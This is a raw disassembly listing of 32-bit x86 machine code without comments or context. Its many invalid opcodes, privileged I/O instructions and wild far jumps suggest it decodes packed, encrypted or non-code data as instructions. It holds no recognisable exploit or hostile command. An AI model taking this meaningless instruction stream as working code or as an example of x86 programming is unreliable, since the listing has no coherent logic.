  42cf5d:	lds    ebx,FWORD PTR [edi+0x50bcde1d]
  42cf63:	add    BYTE PTR [esp+esi*2],dl
  42cf66:	jmp    edx
  42cf68:	sbb    eax,0x2f7dcf5b
  42cf6d:	dec    ebx
  42cf6e:	stos   BYTE PTR es:[edi],al
  42cf6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cf70:	push   0x488f4d48
  42cf75:	fsub   QWORD PTR ds:0xf44b43e8
  42cf7b:	outs   dx,DWORD PTR ds:[esi]
  42cf7c:	xchg   ecx,eax
  42cf7d:	cmp    eax,0x8672e691
  42cf82:	xor    DWORD PTR [esi+0x3570fbda],edx
  42cf88:	(bad)  
  42cf89:	(bad)  [ebp+0x3]
  42cf8c:	imul   edi,DWORD PTR [ebp-0x75be6556],0x31
  42cf93:	mov    dh,0x34
  42cf95:	int    0xe6
  42cf97:	mov    bh,0xb
  42cf99:	pop    esi
  42cf9a:	test   eax,0xa12bb94c
  42cf9f:	sbb    BYTE PTR [edx],0xb5
  42cfa2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cfa3:	dec    esp
  42cfa4:	add    cl,bh
  42cfa6:	std    
  42cfa7:	inc    eax
  42cfa8:	mov    dl,0x9b
  42cfaa:	add    BYTE PTR [edx-0x34cb78ff],dl
  42cfb0:	fnstenv [esi]
  42cfb2:	jo     0x42d01a
  42cfb4:	out    dx,eax
  42cfb5:	or     DWORD PTR [ebx*2-0x363f717a],0xa34a6870
  42cfc0:	scas   al,BYTE PTR es:[edi]
  42cfc1:	add    al,0x75
  42cfc3:	fmul   st,st(4)
  42cfc5:	cmp    eax,DWORD PTR [edi+0x44]
  42cfc8:	inc    ecx
  42cfc9:	add    eax,0xc8d06b2c
  42cfce:	or     esp,DWORD PTR [ebx+edx*8-0x4c648a09]
  42cfd5:	jns    0x42d02f
  42cfd7:	xor    al,0x8d
  42cfd9:	inc    ebx
  42cfda:	jl     0x42cfe7
  42cfdc:	jbe    0x42cfd7
  42cfde:	inc    ebp
  42cfdf:	dec    ecx
  42cfe0:	cmp    bl,BYTE PTR [ebx+0x2cfa07a1]
  42cfe6:	add    al,0x30
  42cfe8:	dec    esp
  42cfe9:	jp     0x42cf9d
  42cfeb:	or     al,0xa2
  42cfed:	jge    0x42d02d
  42cfef:	cwde   
  42cff0:	repnz push ss
  42cff2:	bound  edi,QWORD PTR [ecx-0x104e8864]
  42cff8:	jle    0x42cf7f
  42cffa:	adc    esi,DWORD PTR [edx+0x7]
  42cffd:	cmp    DWORD PTR [ebp-0xd16b7f0],ebp
  42d003:	or     al,0x95
  42d005:	add    ebp,DWORD PTR [eax]
  42d007:	sbb    al,0x3e
  42d009:	iret   
  42d00a:	popa   
  42d00b:	mov    bl,0x53
  42d00d:	xchg   esp,eax
  42d00e:	in     al,dx
  42d00f:	jbe    0x42d05d
  42d011:	out    dx,eax
  42d012:	inc    eax
  42d013:	mov    ds:0x3c8f661d,al
  42d018:	repnz adc BYTE PTR [edi],ah
  42d01b:	hlt    
  42d01c:	inc    edx
  42d01d:	pop    eax
  42d01e:	out    dx,al
  42d01f:	mov    fs:0xea9508e,al
  42d025:	mov    ch,BYTE PTR [eax]
  42d027:	(bad)  
  42d028:	adc    al,0xf
  42d02a:	(bad)  
  42d02b:	mov    esi,0x88e92c5b
  42d030:	sub    edx,DWORD PTR [edi+0x357ea9]
	...
  42d096:	push   eax
  42d097:	cmp    al,dh
  42d099:	sub    al,0xee
  42d09b:	cld    
  42d09c:	cli    
  42d09d:	jle    0x42d0ad
  42d09f:	fmul   DWORD PTR [ebp-0xa]
  42d0a2:	outs   dx,BYTE PTR ds:[esi]
  42d0a3:	mov    ch,0x98
  42d0a5:	push   ss
  42d0a6:	inc    ecx
  42d0a7:	loop   0x42d0aa
  42d0a9:	add    BYTE PTR [edi],al
  42d0ab:	add    DWORD PTR [eax],eax
  42d0ad:	add    BYTE PTR [eax],bl
  42d0af:	and    DWORD PTR [eax+0x5d916646],edi
  42d0b5:	jmp    FWORD PTR ds:0xd28d7e3f
  42d0bb:	mov    ds:0x3d91fb85,eax
  42d0c0:	(bad)  
  42d0c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d0c2:	sub    ch,0x90
  42d0c5:	sbb    dl,BYTE PTR [eax-0x6555d983]
  42d0cb:	or     DWORD PTR [esi+0x18],ecx
  42d0ce:	jae    0x42d0d4
  42d0d0:	pop    ds
  42d0d1:	push   cs
  42d0d2:	adc    al,0x1b
  42d0d4:	retf   
  42d0d5:	(bad)  
  42d0d7:	in     al,0x69
  42d0d9:	out    dx,eax
  42d0da:	mov    ebp,0x95aaa732
  42d0df:	or     al,0xee
  42d0e1:	push   ecx
  42d0e2:	dec    ebp
  42d0e3:	jo     0x42d067
  42d0e5:	cmp    ebx,DWORD PTR [ebx]
  42d0e7:	push   0x5a
  42d0e9:	xchg   esi,eax
  42d0ea:	js     0x42d0f5
  42d0ec:	inc    ebx
  42d0ed:	leave  
  42d0ee:	inc    ebx
  42d0ef:	sti    
  42d0f0:	jg     0x42d164
  42d0f2:	or     eax,0x70c57553
  42d0f7:	push   ecx
  42d0f8:	mov    ecx,0x85f0aeba
  42d0fd:	or     al,0x71
  42d0ff:	je     0x42d0e8
  42d101:	mov    dl,0xf2
  42d103:	fs scas eax,DWORD PTR es:[edi]
  42d105:	hlt    
  42d106:	xor    BYTE PTR [ebx],0xa7
  42d109:	pop    ebp
  42d10a:	cmp    DWORD PTR fs:[ebx],0x54
  42d10e:	(bad)  
  42d110:	add    dh,ah
  42d112:	fcmovne st,st(4)
  42d114:	or     eax,0x8d61a39e
  42d119:	push   es
  42d11a:	(bad)  
  42d11b:	cmc    
  42d11c:	aam    0xd6
  42d11e:	mov    esp,0x804cce26
  42d123:	mov    dl,0x2d
  42d125:	je     0x42d151
  42d127:	out    0x5a,eax
  42d129:	in     al,dx
  42d12a:	push   edi
  42d12b:	scas   eax,DWORD PTR es:[edi]
  42d12c:	mov    DWORD PTR [eax-0xde3e9a3],edx
  42d132:	clc    
  42d133:	xlat   BYTE PTR ds:[ebx]
  42d134:	jbe    0x42d166
  42d136:	imul   eax,DWORD PTR [ebx-0x71781b71],0xffffffe5
  42d13d:	ret    0xea34
  42d140:	sub    cl,ch
  42d142:	and    BYTE PTR gs:[ecx-0x1e],0x8
  42d147:	iret   
  42d148:	imul   ebp,esi,0x4ed3b5a2
  42d14e:	mov    eax,ss
  42d150:	call   0x1450d3eb
  42d155:	xchg   edx,eax
  42d156:	sahf   
  42d157:	ja     0x42d19a
  42d159:	mov    WORD PTR [esi-0x1f],ds
  42d15c:	push   es
  42d15d:	mov    esi,0x589982e1
  42d162:	xchg   DWORD PTR [ebp+0xaf2a499],esp
  42d168:	xor    DWORD PTR [ecx+ebx*2-0x6c],eax
  42d16c:	xor    cl,BYTE PTR [edx+ebx*4]
  42d16f:	loop   0x42d123
  42d171:	jo     0x42d1e2
  42d173:	mov    al,0x77
  42d175:	gs cmp ebp,ebp
  42d178:	das    
  42d179:	ins    BYTE PTR es:[edi],dx
  42d17a:	dec    ecx
  42d17b:	mov    al,ds:0xe762cc40
  42d180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d181:	pop    ebx
  42d182:	push   ss
  42d183:	aad    0x35
  42d185:	jmp    0x32efba4a
  42d18a:	div    DWORD PTR [ecx+edx*2]
  42d18d:	int    0x53
  42d18f:	loopne 0x42d1c5
  42d191:	in     eax,dx
  42d192:	call   0x7dcf7e84
  42d197:	ins    BYTE PTR es:[edi],dx
  42d198:	cli    
  42d199:	aaa    
  42d19a:	and    BYTE PTR [edi+edx*4-0x46],0xe1
  42d19f:	push   0x2b
  42d1a1:	dec    eax
  42d1a2:	aaa    
  42d1a3:	fnstenv [ebp+0x3f1ff187]
  42d1a9:	cmp    BYTE PTR [di+0x4537],ah
  42d1ae:	sbb    al,BYTE PTR [ebx-0x74]
  42d1b1:	mov    edx,0xc6b6e7
	...
  42d216:	lea    ecx,[eax]
  42d218:	pop    ebp
  42d219:	jbe    0x42d1f8
  42d21b:	ja     0x42d1cc
  42d21d:	sti    
  42d21e:	ret    
  42d21f:	or     ebx,esp
  42d221:	pop    ds
  42d222:	out    dx,eax
  42d223:	lds    eax,FWORD PTR [eax+0x1e34871]
  42d229:	add    BYTE PTR [edi],al
  42d22b:	add    DWORD PTR [eax],eax
  42d22d:	add    cl,ch
  42d22f:	pop    ds
  42d230:	cmp    ecx,DWORD PTR [eax-0x62]
  42d233:	dec    esp
  42d234:	rcr    ebx,cl
  42d236:	adc    dl,dl
  42d238:	jno    0x42d1eb
  42d23a:	add    esi,DWORD PTR [edx+0x8f879b0]
  42d240:	mov    al,0x3b
  42d242:	jne    0x42d295
  42d244:	fcomi  st,st(7)
  42d246:	and    dl,BYTE PTR [ebx-0x5405abd7]
  42d24c:	div    DWORD PTR [esi-0x54]
  42d24f:	xchg   BYTE PTR [ecx],dh
  42d251:	jp     0x42d281
  42d253:	rcl    BYTE PTR [ecx],1
  42d255:	addr16 and eax,0x23615c18
  42d25b:	ror    DWORD PTR [edx-0x61],0x9c
  42d25f:	js     0x42d2dd
  42d261:	or     al,0x85
  42d263:	jno    0x42d213
  42d265:	sub    BYTE PTR [edx],ah
  42d267:	and    al,0x99
  42d269:	xchg   esi,eax
  42d26a:	addr16 clc 
  42d26c:	fstp   TBYTE PTR [ecx]
  42d26e:	aad    0x7a
  42d270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d271:	(bad)  
  42d272:	aad    0xb
  42d274:	or     BYTE PTR [ecx+eiz*8],bl
  42d277:	xor    bh,BYTE PTR ds:0x2c3b
  42d27c:	inc    ebx
  42d27d:	mov    BYTE PTR [edi-0x1c],0x2c
  42d281:	inc    ebp
  42d282:	cmp    eax,0x95c29f09
  42d287:	lahf   
  42d288:	outs   dx,BYTE PTR ds:[esi]
  42d289:	dec    esp
  42d28a:	and    al,BYTE PTR [edi]
  42d28c:	push   ecx
  42d28d:	dec    edx
  42d28e:	fisub  WORD PTR [ecx-0x265ffe4f]
  42d294:	push   ecx
  42d295:	mov    esi,0xc9c3e400
  42d29a:	push   cs
  42d29b:	out    0x6a,eax
  42d29d:	mov    dh,0x32
  42d29f:	sti    
  42d2a0:	fldcw  WORD PTR [ebp+0x4c]
  42d2a3:	sbb    ah,BYTE PTR [edx-0x281b0511]
  42d2a9:	fnstenv [ecx]
  42d2ab:	cmp    BYTE PTR [eax+0x2b],0x22
  42d2af:	aad    0x26
  42d2b1:	mov    al,ds:0x1c71c9d5
  42d2b6:	adc    BYTE PTR [ebx],0xb4
  42d2b9:	jge    0x42d293
  42d2bb:	inc    ebp
  42d2bc:	ficom  WORD PTR [ebx-0x7d4292fb]
  42d2c2:	enter  0xcb0f,0x49
  42d2c6:	cmp    BYTE PTR [ebx],ah
  42d2c8:	sub    al,0xa9
  42d2ca:	mov    ah,BYTE PTR [ebx+0x10df7807]
  42d2d0:	xchg   edi,ecx
  42d2d2:	or     edi,0x2946616f
  42d2d8:	test   BYTE PTR [eax-0x4748e678],bh
  42d2de:	sbb    dh,al
  42d2e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d2e1:	adc    DWORD PTR [edi],ebx
  42d2e3:	js     0x42d295
  42d2e5:	push   esp
  42d2e6:	jge    0x42d34c
  42d2e8:	mov    dl,0xa9
  42d2ea:	xchg   ecx,eax
  42d2eb:	dec    ebp
  42d2ec:	test   al,0x9d
  42d2ee:	sbb    eax,0x1e6c7b5d
  42d2f3:	mov    edi,0x4f284de8
  42d2f8:	sbb    ch,BYTE PTR fs:[ebx]
  42d2fb:	or     al,0x2
  42d2fd:	push   ebx
  42d2fe:	daa    
  42d2ff:	arpl   WORD PTR [edi+ecx*1-0x36d15871],bx
  42d306:	out    0xa9,al
  42d308:	mov    esp,0x82a81ed8
  42d30d:	fimul  WORD PTR [eax]
  42d30f:	push   0x56
  42d311:	enter  0xcfb1,0x62
  42d315:	sbb    BYTE PTR [edi],dl
  42d317:	scas   eax,DWORD PTR es:[edi]
  42d318:	aam    0x87
  42d31a:	xchg   BYTE PTR [esi-0x74],al
  42d31d:	add    BYTE PTR [ebx-0x1a],dh
  42d320:	sbb    BYTE PTR [edx],ch
  42d322:	test   DWORD PTR [edi+0x58],0xaab046cf
  42d329:	jno    0x42d33b
  42d32b:	dec    edi
  42d32c:	pushf  
  42d32d:	rcr    DWORD PTR [esi+edx*1+0x70],0xcf
  42d332:	mov    edx,0xbaa0
	...
  42d393:	add    BYTE PTR [eax],al
  42d395:	add    cl,al
  42d397:	into   
  42d398:	arpl   WORD PTR [ecx-0x21044291],bx
  42d39e:	cmp    BYTE PTR [esp+ecx*8+0x2a6a0058],bl
  42d3a5:	push   edx
  42d3a6:	dec    edi
  42d3a7:	in     al,0x1
  42d3a9:	add    BYTE PTR [edi],al
  42d3ab:	add    DWORD PTR [eax],eax
  42d3ad:	add    BYTE PTR [edi],cl
  42d3af:	retf   
  42d3b0:	sub    al,0xa0
  42d3b2:	jbe    0x42d341
  42d3b4:	fidiv  WORD PTR [edi+0x50]
  42d3b7:	inc    ebx
  42d3b8:	cmp    ebx,esi
  42d3ba:	add    dl,BYTE PTR [esp+eax*1]
  42d3bd:	stos   BYTE PTR es:[edi],al
  42d3be:	jnp    0x42d419
  42d3c0:	leave  
  42d3c1:	imul   eax,DWORD PTR [edx+0x75a734ad],0xc65c18a7
  42d3cb:	sub    eax,ebp
  42d3cd:	ror    BYTE PTR [edx+0x5120c97d],1
  42d3d3:	nop
  42d3d4:	daa    
  42d3d5:	test   BYTE PTR [ebp-0x36],0xeb
  42d3d9:	sbb    BYTE PTR [eax+0x5310fb1c],cl
  42d3df:	stc    
  42d3e0:	mov    ds:0xcaf7e7b1,al
  42d3e5:	sbb    esi,DWORD PTR [ecx+ebx*8]
  42d3e8:	mov    ecx,0x75f97cd2
  42d3ed:	mov    eax,DWORD PTR [esi-0x57]
  42d3f0:	or     dh,BYTE PTR [ebp-0x472b5d39]
  42d3f6:	jne    0x42d3b1
  42d3f8:	pop    esi
  42d3f9:	xor    DWORD PTR [ebp-0x5e74c7d9],ecx
  42d3ff:	inc    ecx
  42d400:	clc    
  42d401:	repz mov fs,WORD PTR [eax-0x56]
  42d405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d406:	je     0x42d43d
  42d408:	imul   ebp,ecx,0x72f11938
  42d40e:	xor    edi,edx
  42d410:	arpl   WORD PTR [ebp-0x7a],di
  42d413:	jge    0x42d458
  42d415:	stos   DWORD PTR es:[edi],eax
  42d416:	(bad)  
  42d417:	ins    DWORD PTR es:[edi],dx
  42d418:	mov    eax,0x1470aaed
  42d41d:	mov    ds:0x8c3b4cd4,eax
  42d422:	mov    cl,0x5
  42d424:	push   esp
  42d425:	mov    ds:0x7ea1a722,al
  42d42a:	loope  0x42d3de
  42d42c:	jns    0x42d479
  42d42e:	fistp  QWORD PTR [edx]
  42d430:	(bad)  
  42d431:	ficomp WORD PTR [edi+eiz*8+0x4d]
  42d435:	data16 jnp 0x42d3e3
  42d438:	mov    bh,0x8
  42d43a:	mov    edx,0x655ff113
  42d43f:	test   al,0x74
  42d441:	or     al,0xb1
  42d443:	ud0    esp,DWORD PTR [edi-0x28]
  42d447:	scas   al,BYTE PTR es:[edi]
  42d448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d449:	jne    0x42d405
  42d44b:	test   al,0x9d
  42d44d:	(bad)  
  42d44e:	aad    0xe3
  42d450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d451:	in     al,dx
  42d452:	push   eax
  42d453:	fwait
  42d454:	rcl    BYTE PTR [ecx],cl
  42d456:	aam    0x2a
  42d458:	sub    BYTE PTR [ebx-0x1d937ab1],al
  42d45e:	xlat   BYTE PTR ds:[ebx]
  42d45f:	(bad)  
  42d460:	lock xor ah,ah
  42d463:	lahf   
  42d464:	iret   
  42d465:	mov    edx,0xcdba4ea9
  42d46a:	cs js  0x42d3ee
  42d46d:	ret    
  42d46e:	dec    ebx
  42d46f:	adc    al,dl
  42d471:	popa   
  42d472:	cdq    
  42d473:	pusha  
  42d474:	mov    dl,0xbc
  42d476:	in     al,dx
  42d477:	jbe    0x42d4f4
  42d479:	cs cs xchg ecx,eax
  42d47c:	mov    ebx,0x876b100e
  42d481:	dec    edi
  42d482:	mov    WORD PTR [edi],cs
  42d484:	dec    esi
  42d485:	pop    esi
  42d486:	test   BYTE PTR [eax+0x66],0x29
  42d48a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d48b:	and    BYTE PTR [ecx-0x5],bh
  42d48e:	inc    edi
  42d48f:	lock cmc 
  42d491:	pop    esp
  42d492:	sbb    esi,DWORD PTR [eax+esi*2+0x76]
  42d496:	add    DWORD PTR [edx+0x5d],ebp
  42d499:	inc    edx
  42d49a:	js     0x42d479
  42d49c:	das    
  42d49d:	mov    cl,0xda
  42d49f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d4a0:	in     al,dx
  42d4a1:	mov    ch,0xdc
  42d4a3:	add    BYTE PTR [ebp+0x14],bh
  42d4a6:	stos   DWORD PTR es:[edi],eax
  42d4a7:	xchg   ebx,eax
  42d4a8:	pop    ebp
  42d4a9:	xchg   ebp,eax
  42d4aa:	xor    al,0x1d
  42d4ac:	xchg   esp,eax
  42d4ad:	push   0x7e9475f9
  42d4b2:	sub    DWORD PTR [eax+esi*2+0x0],ebp
	...
  42d515:	add    BYTE PTR [ecx-0x11ac7d0b],bl
  42d51b:	ja     0x42d4f6
  42d51d:	inc    DWORD PTR [eax]
  42d51f:	add    edx,DWORD PTR [eax+0x4ef531f3]
  42d525:	aam    0x56
  42d527:	in     eax,0x1
  42d529:	add    BYTE PTR [edi],al
  42d52b:	add    DWORD PTR [eax],eax
  42d52d:	add    bh,ah
  42d52f:	popf   
  42d530:	loop   0x42d52e
  42d532:	xor    al,0x1b
  42d534:	xchg   edx,eax
  42d535:	sbb    DWORD PTR [eax+ebp*8+0x7eab4be9],ecx
  42d53c:	aad    0x29
  42d53e:	inc    edx
  42d53f:	xchg   ebx,eax
  42d540:	gs pop ebp
  42d542:	loop   0x42d50d
  42d544:	mov    bh,0xfa
  42d546:	mov    eax,ds:0xf3fa387d
  42d54b:	inc    edx
  42d54c:	retf   0xc45d
  42d54f:	xchg   esi,eax
  42d550:	dec    edi
  42d551:	loope  0x42d553
  42d553:	mov    ebp,DWORD PTR [edx-0x40]
  42d556:	dec    esp
  42d557:	stos   DWORD PTR es:[edi],eax
  42d558:	dec    esp
  42d559:	repnz inc esi
  42d55b:	aad    0x2d
  42d55d:	scas   al,BYTE PTR es:[edi]
  42d55e:	dec    edi
  42d55f:	imul   edx,DWORD PTR [esi+0x69],0xffffffa5
  42d563:	xchg   ebx,eax
  42d564:	gs aas 
  42d566:	mov    ds:0x80e1a4b2,eax
  42d56b:	jge    0x42d4f0
  42d56d:	sub    esp,DWORD PTR [ebx-0x6d220ce3]
  42d573:	cdq    
  42d574:	in     eax,0x78
  42d576:	pusha  
  42d577:	ja     0x42d5a2
  42d579:	jecxz  0x42d576
  42d57b:	and    BYTE PTR [edi],0xe
  42d57e:	leave  
  42d57f:	cld    
  42d580:	xchg   DWORD PTR [ecx+0x45],edi
  42d583:	cdq    
  42d584:	jmp    0xc6b37009
  42d589:	outs   dx,BYTE PTR ds:[esi]
  42d58a:	pop    ebp
  42d58b:	push   es
  42d58c:	pop    edi
  42d58d:	add    BYTE PTR ds:0x99a4547f,dl
  42d593:	(bad)  [ebx]
  42d595:	sahf   
  42d596:	adc    al,cl
  42d598:	pop    esp
  42d599:	imul   ecx,DWORD PTR [edx-0x2ccc012e],0xb5cb901e
  42d5a3:	je     0x42d538
  42d5a5:	in     eax,0xc3
  42d5a7:	jne    0x42d5f7
  42d5a9:	sbb    BYTE PTR [ecx],dl
  42d5ab:	mov    esi,0x98f63a77
  42d5b0:	xor    edi,ebx
  42d5b2:	lea    eax,[edx+0x39b9150c]
  42d5b8:	and    esi,ecx
  42d5ba:	sub    cl,BYTE PTR [ebp-0x67]
  42d5bd:	(bad)  
  42d5be:	mov    ebp,0x1103671c
  42d5c3:	add    ch,ch
  42d5c5:	retf   0x258d
  42d5c8:	add    DWORD PTR [edx-0x12],esp
  42d5cb:	popa   
  42d5cc:	inc    edx
  42d5cd:	push   esi
  42d5ce:	adc    DWORD PTR [edi+0x4bb696d7],ecx
  42d5d4:	sub    eax,0x10795ba
  42d5d9:	ins    BYTE PTR es:[edi],dx
  42d5da:	pop    ds
  42d5db:	xchg   ecx,eax
  42d5dc:	and    eax,0x2020ad66
  42d5e1:	leave  
  42d5e2:	add    DWORD PTR [esp+edi*1+0x35],eax
  42d5e6:	jmp    0x3e289a14
  42d5eb:	ror    ah,cl
  42d5ed:	lahf   
  42d5ee:	out    0xc9,eax
  42d5f0:	test   BYTE PTR [edx+0x5c436816],cl
  42d5f6:	arpl   WORD PTR [edi+0x5949552f],dx
  42d5fc:	mov    bh,0xc1
  42d5fe:	add    al,0xc9
  42d600:	clc    
  42d601:	adc    ebp,ebx
  42d603:	lods   eax,DWORD PTR ds:[esi]
  42d604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d605:	mov    al,0x1e
  42d607:	inc    ecx
  42d608:	inc    ebx
  42d609:	(bad)  
  42d60b:	lods   eax,DWORD PTR ds:[esi]
  42d60c:	cs xchg edi,eax
  42d60e:	push   0xffffff8f
  42d610:	pop    ebp
  42d611:	bound  ecx,QWORD PTR [ebx+0x2a]
  42d614:	js     0x42d5da
  42d616:	jmp    0xeec0:0xc3c82bf3
  42d61d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d61e:	clc    
  42d61f:	ds enter 0x86a,0x1e
  42d624:	mov    ah,0xe2
  42d626:	daa    
  42d627:	dec    esi
  42d628:	or     esp,DWORD PTR [ebx+0x5e5420d3]
  42d62e:	push   ss
  42d62f:	aad    0x6e
  42d631:	aad    0x71
  42d633:	push   ebx
  42d634:	xor    al,0x0
	...
  42d696:	repz add esp,DWORD PTR [eax]
  42d699:	(bad)  
  42d69a:	lock scas eax,DWORD PTR es:[edi]
  42d69c:	(bad)  
  42d69d:	jg     0x42d702
  42d69f:	mov    esp,0x55ec8d59
  42d6a4:	das    
  42d6a5:	fistp  WORD PTR [ebp-0x1a]
  42d6a8:	add    DWORD PTR [eax],eax
  42d6aa:	pop    es
  42d6ab:	add    DWORD PTR [eax],eax
  42d6ad:	add    BYTE PTR [edx-0x68],ah
  42d6b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d6b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d6b2:	and    dl,BYTE PTR ds:0x803ed64f
  42d6b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d6b9:	dec    esp
  42d6ba:	sbb    DWORD PTR [edx],0xffffff89
  42d6bd:	adc    ebx,ebp
  42d6bf:	adc    edi,eax
  42d6c1:	mov    ch,0x7e
  42d6c3:	mov    ah,0xbf
  42d6c5:	(bad)  
  42d6c6:	dec    ebp
  42d6c7:	push   edx
  42d6c8:	test   BYTE PTR [edi+ebx*2+0x3d671c1b],dl
  42d6cf:	fld    DWORD PTR [eax]
  42d6d1:	jnp    0x42d6fd
  42d6d3:	mov    ds:0x14cc30f3,al
  42d6d8:	dec    esi
  42d6d9:	dec    ecx
  42d6da:	add    edi,DWORD PTR [esi+0x712fb40c]
  42d6e0:	pop    esi
  42d6e1:	addr16 push 0x9692b471
  42d6e7:	ret    0xd300
  42d6ea:	out    dx,eax
  42d6eb:	ja     0x42d6b9
  42d6ed:	int    0x9f
  42d6ef:	les    edx,FWORD PTR [ecx]
  42d6f1:	mov    WORD PTR [esi],es
  42d6f3:	sub    ebp,DWORD PTR [esp+edx*4+0x46]
  42d6f7:	nop
  42d6f8:	in     al,0x41
  42d6fa:	push   esi
  42d6fb:	popa   
  42d6fc:	ficom  WORD PTR [esi]
  42d6fe:	stc    
  42d6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d700:	das    
  42d701:	mov    dl,BYTE PTR [ecx]
  42d703:	cdq    
  42d704:	in     eax,0x31
  42d706:	pop    es
  42d707:	xor    eax,0xe0d840a5
  42d70c:	jmp    0xcf2:0xa2fdd0e6
  42d713:	and    al,0xab
  42d715:	iret   
  42d716:	(bad)  
  42d717:	mul    ah
  42d719:	ins    DWORD PTR es:[edi],dx
  42d71a:	shl    DWORD PTR [esi-0x4e],1
  42d71d:	cmp    ch,BYTE PTR [esi-0x2e918f5f]
  42d723:	add    al,0x5b
  42d725:	or     al,0x7a
  42d727:	push   ds
  42d728:	paddsb mm2,QWORD PTR [edi+0x2]
  42d72c:	cmp    eax,0xbc02576b
  42d731:	dec    edi
  42d732:	jbe    0x42d780
  42d734:	dec    esi
  42d735:	pop    ecx
  42d736:	loop   0x42d6da
  42d738:	mov    ebx,0x8bcba939
  42d73d:	mov    al,ds:0xba1fddb4
  42d742:	jmp    0x42d707
  42d744:	mov    ah,0xd0
  42d746:	cli    
  42d747:	ins    DWORD PTR es:[edi],dx
  42d748:	loopne 0x42d76e
  42d74a:	inc    ebp
  42d74b:	lods   eax,DWORD PTR ds:[esi]
  42d74c:	outs   dx,DWORD PTR ds:[esi]
  42d74d:	test   bl,al
  42d74f:	ror    DWORD PTR [edi+0x3d327e17],0x7b
  42d756:	lea    ecx,[edi+eiz*2]
  42d759:	jns    0x42d6e2
  42d75b:	or     BYTE PTR [ebx+0x49],bh
  42d75e:	retf   
  42d75f:	mov    ecx,0x7124e90b
  42d764:	in     eax,dx
  42d765:	call   0xd2eca385
  42d76a:	mov    al,0xd2
  42d76c:	add    BYTE PTR [ecx+0x75],bh
  42d76f:	inc    esp
  42d770:	pop    es
  42d771:	or     BYTE PTR [edx],al
  42d773:	or     bl,BYTE PTR [ecx+0x58525bef]
  42d779:	push   eax
  42d77a:	add    esi,esp
  42d77c:	(bad)
  42d780:	clc    
  42d781:	lods   eax,DWORD PTR ds:[esi]
  42d782:	sub    eax,esi
  42d784:	out    dx,eax
  42d785:	sti    
  42d786:	fidiv  DWORD PTR [ebx+0x2be2ce37]
  42d78c:	jo     0x42d743
  42d78e:	or     eax,0xc4e56d61
  42d793:	fnstenv [esi-0x464fe377]
  42d799:	popa   
  42d79a:	mov    ah,0x6f
  42d79c:	mov    ch,0xe3
  42d79e:	clc    
  42d79f:	or     al,0x46
  42d7a1:	jmp    0x5ee5:0x477fee54
  42d7a8:	mov    ah,BYTE PTR [edi-0x43]
  42d7ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d7ac:	fcompp 
  42d7ae:	mov    dh,0xe
  42d7b0:	mov    ebx,0xcdbad083
	...
  42d815:	add    BYTE PTR [esi-0x62a06765],dl
  42d81b:	pop    edi
  42d81c:	xlat   BYTE PTR ds:[ebx]
  42d81d:	fld    TBYTE PTR [eax-0x2b]
  42d820:	push   0x46ddc595
  42d825:	jns    0x42d88b
  42d827:	out    0x1,eax
  42d829:	add    BYTE PTR [edi],al
  42d82b:	add    DWORD PTR [eax],eax
  42d82d:	add    BYTE PTR [ecx+0x38310a22],dh
  42d833:	jne    0x42d7ff
  42d835:	push   edx
  42d836:	daa    
  42d837:	clc    
  42d838:	pop    esp
  42d839:	ror    al,1
  42d83b:	or     DWORD PTR [eax+0x371ce58c],edi
  42d841:	ficom  WORD PTR [esi-0x5f192b02]
  42d847:	jne    0x42d805
  42d849:	xor    DWORD PTR [ebp-0x80],esp
  42d84c:	inc    BYTE PTR [edx+0x2d]
  42d84f:	cwde   
  42d850:	jg     0x42d80e
  42d852:	push   es
  42d853:	loope  0x42d81e
  42d855:	mov    ds:0x91a8e697,al
  42d85a:	lods   al,BYTE PTR ds:[esi]
  42d85b:	push   ds
  42d85c:	add    DWORD PTR [esi+0x23],esi
  42d85f:	pop    ebx
  42d860:	les    ebx,FWORD PTR [edi-0x33]
  42d863:	xchg   ecx,eax
  42d864:	retf   0xddff
  42d867:	pop    eax
  42d868:	sub    al,0xfc
  42d86a:	fsubp  st(3),st
  42d86c:	test   eax,0x6b68ba98
  42d871:	sar    BYTE PTR [edx+eax*4-0x606365db],cl
  42d878:	out    0x46,eax
  42d87a:	cmc    
  42d87b:	adc    DWORD PTR [edx],esi
  42d87d:	or     ch,dl
  42d87f:	xchg   ebp,eax
  42d880:	aas    
  42d881:	inc    ebx
  42d882:	(bad)  
  42d883:	or     al,0x1e
  42d885:	cmp    eax,DWORD PTR [edx+0x737734ab]
  42d88b:	cli    
  42d88c:	rcr    BYTE PTR [edx],1
  42d88e:	dec    edi
  42d88f:	ja     0x42d837
  42d891:	dec    esp
  42d892:	fdiv   QWORD PTR [eax+0x2ba78d08]
  42d898:	mov    cl,0xb1
  42d89a:	sbb    ebx,0x214a035
  42d8a0:	inc    DWORD PTR [edi]
  42d8a2:	jle    0x42d838
  42d8a4:	mov    WORD PTR [esi-0x1e1c4e13],es
  42d8aa:	lds    ecx,FWORD PTR [ecx+0x2bcf663c]
  42d8b0:	ret    0x14ad
  42d8b3:	sub    DWORD PTR [ebx-0x1e],esp
  42d8b6:	out    0xd6,eax
  42d8b8:	jg     0x42d885
  42d8ba:	xor    ch,bh
  42d8bc:	retf   
  42d8bd:	dec    esp
  42d8be:	sti    
  42d8bf:	inc    edx
  42d8c0:	pushf  
  42d8c1:	cmp    DWORD PTR [ebp+0x79],edi
  42d8c4:	mov    bl,0xe3
  42d8c6:	ret    
  42d8c7:	or     eax,0x1078f34d
  42d8cc:	aam    0x28
  42d8ce:	xchg   edx,eax
